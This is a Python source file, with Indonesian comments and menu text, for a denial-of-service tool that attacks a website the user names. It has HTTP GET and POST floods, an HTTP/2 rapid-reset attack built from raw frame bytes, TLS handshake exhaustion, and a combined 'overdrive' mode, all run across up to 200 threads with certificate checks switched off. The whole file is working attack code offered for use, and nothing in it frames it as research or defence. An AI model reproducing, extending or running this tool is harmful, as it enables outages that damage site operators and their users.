#!/usr/bin/env python3
# language: Python 3.8+
# file: web_rapid_fire.py
# 5 Vektor L7 Ekstrem (Kecepatan Maksimal). Tanpa Root.

import os, sys, time, socket, ssl, random, string, threading
import urllib.parse

G1  = "\033[38;5;46m"   
G2  = "\033[38;5;118m"  
W   = "\033[97m" 
R   = "\033[91m" 
Y   = "\033[93m" 
D   = "\033[90m" 
RST = "\033[0m"

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

def clr():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""{G1}
╔══════════════════════════════════════════════════════════════════════════╗
║  ██╗    ██╗███████╗██████╗     ██████╗  █████╗ ██████╗ ██╗██████╗      
║  ██║    ██║██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗     
║  ██║ █╗ ██║█████╗  ██████╔╝    ██████╔╝███████║██████╔╝██║██║  ██║     
║  ██║███╗██║██╔══╝  ██╔══██╗    ██╔══██╗██╔══██║██╔═══╝ ██║██║  ██║     
║  ╚███╔███╔╝███████╗██████╔╝    ██║  ██║██║  ██║██║     ██║██████╔╝     
║   ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝      
║                                                                          
║         {G2}H I G H - S P E E D   L 7   ·   N O   D E L A Y{RST}{G1}
╚══════════════════════════════════════════════════════════════════════════╝{RST}
""")

def ask(p, d=None, k=str):
    suf = f" {D}[{d}]{RST}" if d is not None else ""
    while True:
        try: s = input(f"  {G1}»{RST} {W}{p}{RST}{suf}: ").strip()
        except: sys.exit(0)
        if not s and d is not None: return d
        if not s: continue
        try: return k(s)
        except: print(f"  {R}Format salah.{RST}")

def rand_str(n=8):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

# ═══════════════════════ FAST VECTORS ═══════════════════════

def v_get_flood(host, port, is_ssl, path, secs, th):
    stop = threading.Event()
    req_base = f"GET {path}?{rand_str(6)}={{}} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"

    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((host, port))
                if is_ssl: 
                    s = SSL_CTX.wrap_socket(s, server_hostname=host)
                s.sendall(req_base.format(rand_str(4)).encode())
                s.close()
            except:
                pass

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(th)]
    for t in threads: t.start()
    
    t0 = time.time()
    while time.time() - t0 < secs:
        time.sleep(1)
        sys.stdout.write(f"\r  {G2}»{RST} Nembak GET... {int(time.time()-t0)}/{secs}s   ")
        sys.stdout.flush()
    print()
    stop.set()

def v_post_flood(host, port, is_ssl, path, secs, th):
    stop = threading.Event()
    body = "A=" + "B"*500
    req_base = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(body)}\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n{body}"
    req_bytes = req_base.encode()

    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((host, port))
                if is_ssl: 
                    s = SSL_CTX.wrap_socket(s, server_hostname=host)
                s.sendall(req_bytes)
                s.close()
            except:
                pass

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(th)]
    for t in threads: t.start()
    
    t0 = time.time()
    while time.time() - t0 < secs:
        time.sleep(1)
        sys.stdout.write(f"\r  {G2}»{RST} Nembak POST... {int(time.time()-t0)}/{secs}s   ")
        sys.stdout.flush()
    print()
    stop.set()

def v_rapid_reset(host, port, secs, th):
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    headers = b"\x00\x00\x0f\x01\x05\x00\x00\x00\x01\x82\x84\x86\x41\x8a\x08\x9d\x5c\x0b\x81\x70\xdc\x78\x0f\x03"
    rst = b"\x00\x00\x04\x03\x00\x00\x00\x00\x01\x00\x00\x00\x00"
    packet = preface + settings + headers + rst

    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((host, port))
                if port == 443:
                    s = SSL_CTX.wrap_socket(s, server_hostname=host, alpn_protocols=["h2"])
                s.sendall(packet)
                s.close()
            except: pass

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(th)]
    for t in threads: t.start()
    
    t0 = time.time()
    while time.time() - t0 < secs:
        time.sleep(1)
        sys.stdout.write(f"\r  {G2}»{RST} Nembak HTTP/2... {int(time.time()-t0)}/{secs}s   ")
        sys.stdout.flush()
    print()
    stop.set()

def v_tls_exhaust(host, port, secs, th):
    stop = threading.Event()
    def worker():
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((host, port))
                ss = SSL_CTX.wrap_socket(s, server_hostname=host)
                ss.close()
            except: pass

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(th)]
    for t in threads: t.start()
    
    t0 = time.time()
    while time.time() - t0 < secs:
        time.sleep(1)
        sys.stdout.write(f"\r  {G2}»{RST} Nembak TLS... {int(time.time()-t0)}/{secs}s   ")
        sys.stdout.flush()
    print()
    stop.set()

# ═══════════════════════ MENU ═══════════════════════
def menu():
    while True:
        clr()
        print(f"  {G1}╭────────────────────────────────────────────────────╮{RST}")
        print(f"  {G1}│{RST} {W}HIGH-SPEED VEKTOR (1-5):{RST}                            {G1}│{RST}")
        print(f"  {G1}╰────────────────────────────────────────────────────╯{RST}")
        print(f"  {G1}[1]{RST}  HTTP GET Rapid Fire (Spam Request Cepat)")
        print(f"  {G1}[2]{RST}  HTTP POST Rapid Fire (Spam Body Cepat)")
        print(f"  {G1}[3]{RST}  HTTP/2 Rapid Reset (Bug Protokol)")
        print(f"  {G1}[4]{RST}  TLS Exhaust (Beban SSL)")
        print(f"  {R}[5]{RST}  OVERDRIVE (Tembak Semua Sekaligus)")
        print(f"  {G1}[0]{RST}  Keluar")
        print(f"  {G1}──────────────────────────────────────────────────────{RST}")
        
        try: c = input(f"  {G1}»{RST} Pilih [0-5]: ").strip()
        except: break
        
        if c == "0": break
        if c not in ["1","2","3","4","5"]: continue

        target = ask("URL Website Target (contoh: http://target.com)")
        if not target.startswith("http"): target = "http://" + target
        
        parsed = urllib.parse.urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        is_ssl = (parsed.scheme == "https")
        path = parsed.path or "/"
        
        print(f"  {G1}✔{RST} Target: {host}:{port} (SSL: {is_ssl})")
        
        secs = ask("Durasi (detik)", 60, int)
        th = ask("Jumlah Thread (Maks 200)", 150, int)
        
        if th > 200:
            print(f"  {Y}⚠ Thread dibatasi maksimal 200 agar Termux tidak force close.{RST}")
            th = 200

        print(f"\n  {G2}[*] Memulai tembakan cepat...{RST}")
        
        try:
            if c == "1": v_get_flood(host, port, is_ssl, path, secs, th)
            elif c == "2": v_post_flood(host, port, is_ssl, path, secs, th)
            elif c == "3": v_rapid_reset(host, port, secs, th)
            elif c == "4": v_tls_exhaust(host, port, secs, th)
            elif c == "5":
                # Mode Overdrive (Semua jalan bersamaan)
                t1 = threading.Thread(target=v_get_flood, args=(host, port, is_ssl, path, secs, th//2))
                t2 = threading.Thread(target=v_rapid_reset, args=(host, port, secs, th//2))
                t1.start(); t2.start()
                t1.join(); t2.join()
                
        except Exception as e:
            print(f"\n  {R}[x] Error tak terduga: {e}{RST}")

        input(f"\n  {D}[Enter untuk kembali]{RST}")

if __name__ == "__main__":
    try: menu()
    except KeyboardInterrupt: print()..